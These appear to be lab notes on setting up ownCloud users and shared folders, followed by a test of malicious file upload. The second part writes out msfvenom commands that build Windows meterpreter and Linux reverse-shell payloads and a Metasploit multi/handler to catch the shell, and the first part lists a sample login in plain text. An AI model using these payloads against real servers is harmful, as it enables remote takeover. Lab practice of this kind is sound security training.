1) Creating User Accounts and assigning user rights in owncloud 
	1) open owncloud admin panel by clicking on the right top 
	2) on admin  page type username and password you want to create 
	3) To share files with users click menu icon on top left and click files 
	4) click `+`  to add a folder and rename the folder as share
	5) open the folder and try to upload the files 
	6) on the share folder click `...` and click on detail and open sharing tab 
	7) add the name of the user in users and groups 
	8) open the user computer enter the `http://IP/owncloud/`
	9) enter the credential username shane and password florida@123
	10) click on the share  folder 
	11) open the windows server and open ownDesktop Client 
	12) install it and enter the admin credentials 
	13) do next next and done
	14) owncloud is then synced with `C:\users\admin\owncloud` 
	15) copy any file in any directory and place in the above path will be shared on the cloud 


2) Securing owncloud from malicious file upload 
	1) msfvenom -p windows/meterpreter/reverse_tcp -f exe > /root/Desktop/trojan.exe 
	2) from firefox open owncloud 
	3) using shanes IP pass login
	4) try to upload the trojan but unable to upload due  to filtering 
	5) msfvenom -p linux/x86/shell/reverse_tcp LHOST=  LPORT= --platform linux -f elf > /root/Desktop/exploit.elf
	6) we are able to exploit it 
	7) msfconsole exploit , multi handler set payload  linux/x86/shell/reverse_tcp
	8) go to ubuntu server and change the file permissions in elf file 